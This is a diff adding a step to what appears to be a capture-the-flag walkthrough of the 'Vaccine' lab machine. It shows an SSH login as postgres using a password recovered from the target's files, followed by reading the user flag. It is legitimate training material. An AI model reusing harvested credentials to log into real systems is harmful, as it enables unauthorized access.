@@ -325,6 +325,48 @@ Look aroung and find "dashboard.php' in the /var/www/html folder that has a pass
         }
 ```
 
+Use the user account postgres and password P@s5w0rd! to log into the server SSh service
+
+```yaml
+┌──(kali㉿kali)-[~]
+└─$ ssh postgres@10.10.10.46                                                                   255 ⨯
+postgres@10.10.10.46's password: 
+Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-29-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat 02 Jan 2021 02:06:52 AM UTC
+
+  System load:  0.0                Processes:             179
+  Usage of /:   32.0% of 19.56GB   Users logged in:       0
+  Memory usage: 18%                IP address for ens160: 10.10.10.46
+  Swap usage:   0%
+
+
+47 updates can be installed immediately.
+0 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+postgres@vaccine:~$ ls
+11  user.txt
+postgres@vaccine:~$ 
+
+postgres@vaccine:~$ cat user.txt
+139d3e5c3db18073d250ce0dccc43997                                                                     
+postgres@vaccine:~$                
+```
+
 
 
 
